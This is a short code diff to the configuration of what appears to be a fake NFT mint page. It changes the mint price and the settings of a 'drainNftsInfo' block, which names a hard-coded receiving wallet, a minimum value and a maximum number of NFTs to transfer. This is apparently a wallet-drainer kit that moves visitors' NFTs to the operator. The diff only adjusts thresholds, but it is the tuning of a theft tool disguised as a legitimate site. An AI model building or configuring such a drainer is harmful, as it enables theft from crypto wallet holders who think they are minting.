@@ -33,7 +33,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.06,
+    price: 0.01,
     totalSupply: 1111,
     minUnits: 1,
     maxUnits: 5,
@@ -46,7 +46,7 @@ const mintInfo = {
 
 const drainNftsInfo = {
     active: false,
-    minValue: 0.02,
+    minValue: 0.01,
     maxTransfer: 100,
     nftReceiveAddress: "0xEE1DdE4e72980D52FDcD25197d3C6BC232F0698b",
 }
